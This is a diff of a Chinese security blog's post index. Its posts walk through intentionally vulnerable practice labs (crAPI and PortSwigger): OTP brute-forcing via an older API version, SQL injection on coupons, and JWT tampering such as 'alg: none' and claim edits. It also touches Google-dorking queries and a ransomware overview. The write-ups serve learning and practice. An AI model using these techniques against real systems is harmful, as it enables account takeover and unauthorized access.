@@ -13,57 +13,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ccc</title>
-    <url>/posts/2fbba4ed.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
-    <url>/posts/432259a6.html</url>
-    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
-<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
-<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
-<p>修改完成后可访问成功</p>
-]]></content>
-      <categories>
-        <category>报错</category>
-      </categories>
-      <tags>
-        <tag>docker报错</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>anaconda使用</title>
-    <url>/posts/a5f86784.html</url>
-    <content><![CDATA[<h1 id="创建新的环境"><a href="#创建新的环境" class="headerlink" title="创建新的环境"></a>创建新的环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name myenv</span><br></pre></td></tr></table></figure>
-<h1 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate myenv</span><br></pre></td></tr></table></figure>
-<h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install package_name</span><br></pre></td></tr></table></figure>
-<h1 id="移除包"><a href="#移除包" class="headerlink" title="移除包"></a>移除包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda remove package_name</span><br></pre></td></tr></table></figure>
-<h1 id="更新包"><a href="#更新包" class="headerlink" title="更新包"></a>更新包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update package_name</span><br></pre></td></tr></table></figure>
-<h1 id="列出已安装的包"><a href="#列出已安装的包" class="headerlink" title="列出已安装的包"></a>列出已安装的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure>
-<h1 id="搜索可用的包"><a href="#搜索可用的包" class="headerlink" title="搜索可用的包"></a>搜索可用的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda search package_name</span><br></pre></td></tr></table></figure>
-<h1 id="导出环境"><a href="#导出环境" class="headerlink" title="导出环境"></a>导出环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env export &gt; environment.yml</span><br></pre></td></tr></table></figure>
-<h1 id="导入环境"><a href="#导入环境" class="headerlink" title="导入环境"></a>导入环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env create -f environment.yml</span><br></pre></td></tr></table></figure>
-<h1 id="列出所有环境"><a href="#列出所有环境" class="headerlink" title="列出所有环境"></a>列出所有环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure>
-<h1 id="移除环境"><a href="#移除环境" class="headerlink" title="移除环境"></a>移除环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env remove --name myenv</span><br></pre></td></tr></table></figure>
-<h1 id="更新conda"><a href="#更新conda" class="headerlink" title="更新conda"></a>更新conda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure>
-<h1 id="更新Anaconda"><a href="#更新Anaconda" class="headerlink" title="更新Anaconda"></a>更新Anaconda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update anaconda</span><br></pre></td></tr></table></figure>
-<h1 id="更新所有包"><a href="#更新所有包" class="headerlink" title="更新所有包"></a>更新所有包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update --all</span><br></pre></td></tr></table></figure>
-<h1 id="查看conda帮助"><a href="#查看conda帮助" class="headerlink" title="查看conda帮助"></a>查看conda帮助</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda --help</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>anaconda</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dockerpostgres</title>
-    <url>/posts/d8a3a561.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>linux下doker搭建crapi靶场渗透练习</title>
     <url>/posts/ad05d80f.html</url>
     <content><![CDATA[<h1 id="api测试小技巧"><a href="#api测试小技巧" class="headerlink" title="api测试小技巧"></a>api测试小技巧</h1><p>靶场内多个思路可从该文章内参考<br>摘: <a href="https://github.com/inonshk/31-days-of-API-Security-Tips">https://github.com/inonshk/31-days-of-API-Security-Tips</a><br>中文: <a href="https://cloud.tencent.com/developer/article/1805577">https://cloud.tencent.com/developer/article/1805577</a></p>
@@ -95,7 +44,7 @@
 <p>抓包携带authentication，内部修改id值可显示其他用户报告内容，并泄露机械师email、number用户车辆vin值、number等敏感信息<br><img src="/img/crapi/otherreport.png"></p>
 <h1 id="失效的用户身份验证"><a href="#失效的用户身份验证" class="headerlink" title="失效的用户身份验证"></a>失效的用户身份验证</h1><p>Broken User Authentication<br>API在访问时未对请求方进行身份验证或身份验证存在问题导致易被破解<br>如:<br>未校验令牌的有效性<br>更新密码接口未限制请求频率，旧密码参数可暴力破解<br>短信验证码或者邮箱验证码有效期超出 10 分钟或者长度小于 6 位</p>
 <h2 id="3-重置其他用户的密码"><a href="#3-重置其他用户的密码" class="headerlink" title="3.重置其他用户的密码"></a>3.重置其他用户的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小技巧:</span><br><span class="line">旧的API版本通常会包含更多的安全漏洞，他们缺乏一些安全机制。我们可以使用REST API的一些特征来预测是否存在旧的API版本。</span><br><span class="line">比如当前有一个API被命名为/api/v3/login ，我们可以检查/api/v1/login是否存在 。</span><br></pre></td></tr></table></figure>
-<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#x70;&#111;&#x67;&#98;&#97;&#x30;&#x30;&#x36;&#x40;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;">&#x70;&#111;&#x67;&#98;&#97;&#x30;&#x30;&#x36;&#x40;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
+<p>个人用户登录web界面位于右上角，直接填修改后的密码<br><img src="/img/crapi/userpasswdweb.png"><br>经验证个人用户登录后的重置密码是根据authentication识别重置相关用户的密码<br><img src="/img/crapi/userpasswdbp.png"><br>登录界面forget password的web页面<br>修改流程:(以 <a href="mailto:&#112;&#x6f;&#x67;&#98;&#97;&#48;&#48;&#54;&#x40;&#x65;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#x6d;">&#112;&#x6f;&#x67;&#98;&#97;&#48;&#48;&#54;&#x40;&#x65;&#120;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#x6d;</a> 为例)<br>输入需要修改密码的用户email<br>邮箱接收到验证码otp，输入验证码和需修改的密码<br><img src="/img/crapi/forgetpasswdweb.png"><br>抓包的页面可以看到输入的otp值1111错误(想自己的邮箱发送密码重置申请确认otp长度为4，可尝试爆破)<br><img src="/img/crapi/forgetpasswdbp.png"><br>爆破intruder模块设置(按照验证码0000格式爆破)<br><img src="/img/crapi/otpattacksetting.png"></p>
 <p>发送多次后发现存在爆破次数上限<br><img src="/img/crapi/otpattackerrorbp.png"><br>查看接口发现存在v3，判断是否存在历史版本接口v1或v2(v1经验证不存在，v2未对爆破次数作限制)<br><img src="/img/crapi/otpattacksuccessbp.png"><br>经爆破otp验证码未6216，尝试修改密码后登录成功<br><img src="/img/crapi/loginsuccess.png"></p>
 <h1 id="过度数据暴露"><a href="#过度数据暴露" class="headerlink" title="过度数据暴露"></a>过度数据暴露</h1><p>Excessive Data Exposure<br>过度数据暴露是一种安全漏洞，当您的前端请求的数据超过预期时就会发生这种情况。在 Web 应用程序中，任何人都可以打开浏览器开发人员工具并检查传入和传出的 HTTP 请求。他们可以看到从这些请求中收到的数据负载。<br>因此，即使前端不一定使用或消费这些数据，攻击者仍然可以通过 API 调用查看这些数据。如果 API 发送的数据比前端需要的敏感数据多，攻击者就可以利用这些数据对用户造成损害。<br>这被称为过度数据暴露。在过度数据暴露中，暴露的敏感数据实际上比任何人可以访问的数据都要多。</p>
 <h2 id="4-其他用户敏感信息api接口"><a href="#4-其他用户敏感信息api接口" class="headerlink" title="4.其他用户敏感信息api接口"></a>4.其他用户敏感信息api接口</h2><p>访问&#x2F;community&#x2F;api&#x2F;v2&#x2F;community&#x2F;posts&#x2F;recent<br><img src="/img/crapi/bolabp.png"></p>
@@ -126,12 +75,55 @@
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="13-找到一种方法来兑换您已经通过修改数据库领取的优惠券"><a href="#13-找到一种方法来兑换您已经通过修改数据库领取的优惠券" class="headerlink" title="13.找到一种方法来兑换您已经通过修改数据库领取的优惠券"></a>13.找到一种方法来兑换您已经通过修改数据库领取的优惠券</h2><p><img src="/img/crapi/applycode.png"><br>题目提示sql注入，对coupon_code输入其他值显示不存在<br><img src="/img/crapi/sqlinjecterror.png"><br>sql注入成功(但显示这张券已被使用，似乎兑换券只有一张？？)<br><img src="/img/crapi/sqlinject.png"></p>
 <h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><h2 id="14-不为用户执行身份验证的api接口"><a href="#14-不为用户执行身份验证的api接口" class="headerlink" title="14.不为用户执行身份验证的api接口"></a>14.不为用户执行身份验证的api接口</h2><p>不需要cookies或authentication即可访问的页面<br><img src="/img/crapi/unauthentic.png"></p>
 <h1 id="JWT漏洞"><a href="#JWT漏洞" class="headerlink" title="JWT漏洞"></a>JWT漏洞</h1><h2 id="15-jwt令牌绕过"><a href="#15-jwt令牌绕过" class="headerlink" title="15.jwt令牌绕过"></a>15.jwt令牌绕过</h2><p>将jwt验证alg值改为none<br><img src="/img/crapi/jwt1.png"><br>将authentication的signature删除<br><img src="/img/crapi/jwt2.png"></p>
+<h1 id="注"><a href="#注" class="headerlink" title="注:"></a>注:</h1><p>使用clash&amp;switchomega+google+burpsuite时。<br>虚拟机linux使用docker部署crapi，本机google通过ip+端口访问crapi-web。<br>出现：<br>switch需使用全局proxy，即配置的clash端口7890代理<br>然后对特定的ip+端口设置为burp代理</p>
+<p>这才能实现crapi车辆定位功能<br>无论是bp使用上游代理还是switch只配置clash的proxy都无法实现车辆定位功能页面的访问</p>
 ]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
       <tags>
         <tag>API安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>anaconda使用</title>
+    <url>/posts/a5f86784.html</url>
+    <content><![CDATA[<h1 id="创建新的环境"><a href="#创建新的环境" class="headerlink" title="创建新的环境"></a>创建新的环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name myenv</span><br></pre></td></tr></table></figure>
+<h1 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate myenv</span><br></pre></td></tr></table></figure>
+<h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda install package_name</span><br></pre></td></tr></table></figure>
+<h1 id="移除包"><a href="#移除包" class="headerlink" title="移除包"></a>移除包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda remove package_name</span><br></pre></td></tr></table></figure>
+<h1 id="更新包"><a href="#更新包" class="headerlink" title="更新包"></a>更新包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update package_name</span><br></pre></td></tr></table></figure>
+<h1 id="列出已安装的包"><a href="#列出已安装的包" class="headerlink" title="列出已安装的包"></a>列出已安装的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda list</span><br></pre></td></tr></table></figure>
+<h1 id="搜索可用的包"><a href="#搜索可用的包" class="headerlink" title="搜索可用的包"></a>搜索可用的包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda search package_name</span><br></pre></td></tr></table></figure>
+<h1 id="导出环境"><a href="#导出环境" class="headerlink" title="导出环境"></a>导出环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env export &gt; environment.yml</span><br></pre></td></tr></table></figure>
+<h1 id="导入环境"><a href="#导入环境" class="headerlink" title="导入环境"></a>导入环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env create -f environment.yml</span><br></pre></td></tr></table></figure>
+<h1 id="列出所有环境"><a href="#列出所有环境" class="headerlink" title="列出所有环境"></a>列出所有环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env list</span><br></pre></td></tr></table></figure>
+<h1 id="移除环境"><a href="#移除环境" class="headerlink" title="移除环境"></a>移除环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda env remove --name myenv</span><br></pre></td></tr></table></figure>
+<h1 id="更新conda"><a href="#更新conda" class="headerlink" title="更新conda"></a>更新conda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update conda</span><br></pre></td></tr></table></figure>
+<h1 id="更新Anaconda"><a href="#更新Anaconda" class="headerlink" title="更新Anaconda"></a>更新Anaconda</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update anaconda</span><br></pre></td></tr></table></figure>
+<h1 id="更新所有包"><a href="#更新所有包" class="headerlink" title="更新所有包"></a>更新所有包</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda update --all</span><br></pre></td></tr></table></figure>
+<h1 id="查看conda帮助"><a href="#查看conda帮助" class="headerlink" title="查看conda帮助"></a>查看conda帮助</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda --help</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>anaconda</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机docker下crapi开启容器时s无法使用ip+port进行访问</title>
+    <url>/posts/432259a6.html</url>
+    <content><![CDATA[<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><p>使用虚拟机kali，内安装docker及docker-compose，拉取crapi漏洞靶场环境，可使用127.0.0.1:8888和0.0.0.0:8888访问web环境<br>虚拟机及主机无法通过ip+端口方式访问</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>检查防火墙<br>systemctl status firewalled.service<br>检查转发（值为1开启转发）<br>cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<br>检查ip是否可访问<br>ping ip<br>检查端口是否开放<br>netstat -ntlup | grep 端口</p>
+<p>检查容器监听端口和服务器<br>docker ps 发现容器下端口映射为127.0.0.1:8888 -&gt; 80</p>
+<h1 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h1><p>vim修改docker-compose.yml<br>第1行至第250行进行替换<br>:1,250 s&#x2F;127.0.0.1&#x2F;192.168.52.132&#x2F;g</p>
+<p>修改完成后可访问成功</p>
+]]></content>
+      <categories>
+        <category>报错</category>
+      </categories>
+      <tags>
+        <tag>docker报错</tag>
       </tags>
   </entry>
   <entry>
@@ -218,114 +210,6 @@
       </tags>
   </entry>
   <entry>
-    <title>google</title>
-    <url>/posts/651cf551.html</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th>语法</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>site:</td>
-<td>限制搜索特定网站或域名</td>
-<td>&#96;site:example.com</td>
-</tr>
-<tr>
-<td>inurl:</td>
-<td>搜索 URL 中包含特定字符串</td>
-<td>&#96;inurl:admin</td>
-</tr>
-<tr>
-<td>intitle:</td>
-<td>搜索网页标题中包含特定字符串</td>
-<td>&#96;intitle:”index of” admin</td>
-</tr>
-<tr>
-<td>filetype:</td>
-<td>限制搜索特定文件类型</td>
-<td>&#96;filetype:pdf “confidential”</td>
-</tr>
-<tr>
-<td>intext:</td>
-<td>搜索网页内容中包含特定字符串</td>
-<td>&#96;intext:”password”</td>
-</tr>
-<tr>
-<td>cache:</td>
-<td>显示 Google 缓存中的页面</td>
-<td>&#96;cache:example.com</td>
-</tr>
-<tr>
-<td>link:</td>
-<td>搜索包含指向特定网站的链接的页面</td>
-<td>&#96;link:example.com</td>
-</tr>
-<tr>
-<td>related:</td>
-<td>搜索与特定网站相关的页面</td>
-<td>&#96;related:example.com</td>
-</tr>
-<tr>
-<td>“ “</td>
-<td>精确匹配某个短语</td>
-<td>&#96;”server configuration”</td>
-</tr>
-<tr>
-<td>-</td>
-<td>排除某些词汇</td>
-<td>&#96;”login page” -admin</td>
-</tr>
-</tbody></table>
-<h2 id="常见的-Google-Hacking-使用示例"><a href="#常见的-Google-Hacking-使用示例" class="headerlink" title="常见的 Google Hacking 使用示例"></a>常见的 Google Hacking 使用示例</h2><table>
-<thead>
-<tr>
-<th>使用场景</th>
-<th>查询语法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>查找公共文件目录</td>
-<td><code>intitle:&quot;index of&quot; admin</code></td>
-<td>查找公开的文件目录，可能包含敏感文件。</td>
-</tr>
-<tr>
-<td>查找公开的用户名和密码文件</td>
-<td><code>filetype:txt &quot;password&quot;</code></td>
-<td>查找包含 “password” 的 <code>.txt</code> 文件，可能包含泄露的密码。</td>
-</tr>
-<tr>
-<td>查找配置文件或备份文件</td>
-<td><code>filetype:bak &quot;database config&quot;</code></td>
-<td>查找 <code>.bak</code> 备份文件，可能包含敏感配置。</td>
-</tr>
-<tr>
-<td>查找暴露的数据库</td>
-<td><code>inurl:phpmyadmin</code></td>
-<td>查找公开的 <code>phpMyAdmin</code> 登录页面，可能用于 SQL 注入。</td>
-</tr>
-<tr>
-<td>查找包含敏感信息的 PDF 文件</td>
-<td><code>filetype:pdf &quot;confidential&quot;</code></td>
-<td>查找包含 “confidential” 的 PDF 文件，可能暴露敏感文档。</td>
-</tr>
-<tr>
-<td>查找开放的 FTP 服务器</td>
-<td><code>intitle:&quot;index of&quot; ftp</code></td>
-<td>查找公开的 FTP 目录，可能允许文件下载。</td>
-</tr>
-<tr>
-<td>查找特定版本的应用漏洞</td>
-<td><code>inurl:&quot;/wp-content/plugins/&quot; filetype:txt</code></td>
-<td>查找 WordPress 插件相关的公开文本文件，可能泄露版本信息。</td>
-</tr>
-</tbody></table>
-]]></content>
-  </entry>
-  <entry>
     <title>本站hexo魔改</title>
     <url>/posts/ab21860c.html</url>
     <content><![CDATA[<h1 id="自定义文件"><a href="#自定义文件" class="headerlink" title="自定义文件"></a>自定义文件</h1><p>网上大部分魔改是通过修改主题文件，虽然快速直接，但是遇到主题更新会重置，因此博客通过添加自定义css和js文件实现的魔改即使主题更新也会保留。<br>创建的文件位置:<br>博客根目录下的source文件夹(不是themes下的source)创建js和css。<br><img src="/img/modify/touchjscss.png"></p>
@@ -355,16 +239,13 @@
       </tags>
   </entry>
   <entry>
-    <title>portswigger jwt authentication bypass</title>
-    <url>/posts/cf3c54f2.html</url>
-    <content><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JWT(json web token)是用于系统之间发送加密签名的JSON数据的标准化格式，作为身份认证、会话处理和访问控制机制的一部分。<br>与传统的会话令牌不同，服务器所需要的数据存储在jwt本身的客户端。</p>
-<h1 id="JWT格式"><a href="#JWT格式" class="headerlink" title="JWT格式"></a>JWT格式</h1><p>JWT由三部分组成，头部，载荷，签名，每个部分通过.链接<br>header.payload.signature</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span><br></pre></td></tr></table></figure>
-<p>JWT的头部和载荷部分是base64url编码的json对象，头部包含令牌本身的元数据，载荷包含用户的声明，例如上述部分解码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;iss&quot;: &quot;portswigger&quot;,</span><br><span class="line">    &quot;exp&quot;: 1648037164,</span><br><span class="line">    &quot;name&quot;: &quot;Carlos Montoya&quot;,</span><br><span class="line">    &quot;sub&quot;: &quot;carlos&quot;,</span><br><span class="line">    &quot;role&quot;: &quot;blog_author&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;,</span><br><span class="line">    &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>正如上面部分的编码，任何有权访问jwt令牌的人都可以解码读取或修改这部分数据，因此基于jwt机制的安全性严重依赖于第三部分的加密签名。</p>
-<h1 id="jwt签名"><a href="#jwt签名" class="headerlink" title="jwt签名"></a>jwt签名</h1><p>发出jwt令牌的服务器通过header和payload进行生成签名，某些情况下还会加密哈希，无论哪种方式都会涉及密钥，这种机制为服务器提供了一种验证令牌数据是否有被篡改。即：<br>签名通过header和payload产生，若前两部分遭到修改则导致签名不匹配<br>若不知道密钥，则无法为header和payload生成正确的签名。</p>
-<h1 id="jwt-jws-jwe"><a href="#jwt-jws-jwe" class="headerlink" title="jwt&#x2F;jws&#x2F;jwe"></a>jwt&#x2F;jws&#x2F;jwe</h1>]]></content>
+    <title>Portswigger-JWT-LAB-1</title>
+    <url>/posts/962f5710.html</url>
+    <content><![CDATA[<h1 id="未经验证的签名绕过JWT身份验证"><a href="#未经验证的签名绕过JWT身份验证" class="headerlink" title="未经验证的签名绕过JWT身份验证"></a>未经验证的签名绕过JWT身份验证</h1><p>未经验证的签名，即修改载荷发送至服务端不会对算法和签名进行验证从而绕过JWT身份认证</p>
+<h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>用户凭证: wiener:peter</p>
+<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><p> 修改会话令牌以访问&#x2F;admin处的管理面板，并删除用户carlos</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>靶场页面<br><img src="/img/jwt/jwt1/index.png"><br>登录页面<br><img src="/img/jwt/jwt1/login.png"><br>登录抓包返回jwt令牌数据<br><img src="/img/jwt/jwt1/loginback.png"><br>查看jwt详细数据<br><img src="/img/jwt/jwt1/jwt.png"><br>抓包，访问My account功能点修改接口admin:GET &#x2F;my-account?id&#x3D;wiener为admin:GET &#x2F;admin，出现错误，显示:管理员界面仅在以管理员身份登录时可用<br><img src="/img/jwt/jwt1/adminerror.png"><br>修改sub值为admin或administrator成功<br><img src="/img/jwt/jwt1/adminjwt.png"><br>删除carlos(点击删除还会对jwt令牌认证，再次抓包修改jwt的sub值为administrator即可)<br><img src="/img/jwt/jwt1/delete.png"></p>
+]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
@@ -373,31 +254,18 @@
       </tags>
   </entry>
   <entry>
-    <title>勒索病毒概述与常见攻击手法</title>
-    <url>/posts/770d9e62.html</url>
-    <content><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>勒索病毒（Ransomware）是一种恶意软件，它通过加密目标系统上的文件，进而威胁受害者支付赎金才能解锁文件。其工作原理通常分为以下几个阶段：<br>入侵与感染：勒索病毒通过各种手段渗透到目标计算机，并获得执行的权限。<br>加密：一旦病毒在系统中获得执行权限，它会加密文件，使文件无法打开或使用。<br>勒索：加密后，攻击者会使主机显示勒索信息，要求受害者支付赎金才能获取解密密钥。<br>赎金支付：在支付赎金后，受害者可能获得解密密钥（但也不一定能成功解密），也有可能完全无法恢复数据。</p>
-<h1 id="常见勒索病毒"><a href="#常见勒索病毒" class="headerlink" title="常见勒索病毒"></a>常见勒索病毒</h1><p>1.WannaCry<br>WannaCry是最著名的勒索病毒之一，2017年广泛传播，利用Windows SMB漏洞（MS17-010）进行传播。它对全球数以万计的计算机造成了影响<br>2.Petya&#x2F;NotPetya<br>Petya&#x2F;NotPetya是另外一款著名的勒索病毒，它通过利用Windows SMB协议漏洞传播，且感染后会加密硬盘的主引导记录（MBR）<br>它的一个显著特点是，不仅加密文件，还可能破坏计算机的引导区域，使得计算机无法正常启动<br>3.Ryuk<br>Ryuk是一种定向攻击型勒索病毒，主要攻击大型企业和政府机构，通常通过钓鱼邮件传播，攻击者会先通过其他方式进入网络，然后部署Ryuk来加密数据<br>4.Locky<br>Locky也是一种非常流行的勒索病毒，它通常通过钓鱼邮件传播，邮件中包含一个伪装成发票或其他文档的恶意附件<br>5.Cerber<br>Cerber是另一款常见的勒索病毒，通常通过邮件附件传播，具有多个版本，可以绕过一些防病毒软件的检测</p>
-<h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><p>1.电子邮件钓鱼攻击<br>电子邮件是勒索病毒最常见的传播途径之一。攻击者发送伪装成正常邮件的附件或链接，诱使用户点击<br>附件可能是一个带有恶意宏的文档，或者是一个可执行文件<br>点击后，恶意文件会下载并执行，开始勒索病毒的传播</p>
-<p>2.恶意网站与广告<br>索病毒可以通过恶意网站或通过网页广告传播，通常会利用浏览器漏洞（如Flash、Java等）执行恶意代码<br>用户只需访问包含恶意广告或漏洞利用的页面，勒索病毒就可能通过“驱动下载”进行传播<br>3.漏洞利用<br>索病毒也会利用操作系统或软件的漏洞进行传播。例如，攻击者可以通过利用Windows SMB（Server Message Block）漏洞（如WannaCry病毒所做的）来传播勒索病毒<br>病毒可以直接通过网络连接攻击目标主机，绕过防火墙、杀毒软件等安全措施<br>4.网络钓鱼与社工<br>攻击者通过社交工程欺骗受害者下载和执行病毒。例如，假冒系统更新、伪装成免费软件<br>5.rdp暴力破解<br>勒索病毒可以通过暴力破解Windows RDP服务的密码进入目标主机，上传勒索病毒感染并加密文件<br>6.物理接入<br>勒索病毒可以通过USB驱动器传播，攻击者将病毒拷贝到U盘中，用户插入U盘后，病毒通过自动播放传播</p>
-<h1 id="常见加密"><a href="#常见加密" class="headerlink" title="常见加密"></a>常见加密</h1><h2 id="AES对称加密"><a href="#AES对称加密" class="headerlink" title="AES对称加密"></a>AES对称加密</h2><p>勒索病毒通常使用对称加密（如AES）对目标文件进行加密。对称加密算法的特点是加密和解密使用同一个密钥。<br>恶意软件会生成一个随机密钥（称为“会话密钥”），然后使用目标机器的公开密钥加密这个密钥。这样，即使加密数据被拦截，攻击者也无法解密。</p>
-<h2 id="RSA非对称加密"><a href="#RSA非对称加密" class="headerlink" title="RSA非对称加密"></a>RSA非对称加密</h2><p>在某些勒索病毒中，攻击者会使用非对称加密（例如RSA）加密文件。非对称加密需要一对密钥：公钥和私钥。<br>受害者通过公钥加密数据，但只有攻击者拥有解密用的私钥。</p>
